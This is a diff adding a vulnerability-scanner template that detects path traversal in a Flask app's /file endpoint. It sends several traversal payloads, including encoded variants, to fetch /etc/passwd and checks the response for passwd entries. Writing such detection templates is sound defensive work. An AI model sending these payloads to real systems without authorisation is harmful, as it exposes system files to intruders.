@@ -1,0 +1,30 @@
+id: flask-path-traversal
+
+info:
+  name: Flask App - Path Traversal in File Endpoint
+  author: vulnremediate
+  severity: high
+  description: Path Traversal vulnerability in /file endpoint
+  tags: lfi,traversal,flask
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/file?path=../../etc/passwd"
+      - "{{BaseURL}}/file?path=..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}/file?path=....//....//etc/passwd"
+      - "{{BaseURL}}/file?path=/etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "daemon:.*:"
+        condition: or
+
+      - type: status
+        status:
+          - 200
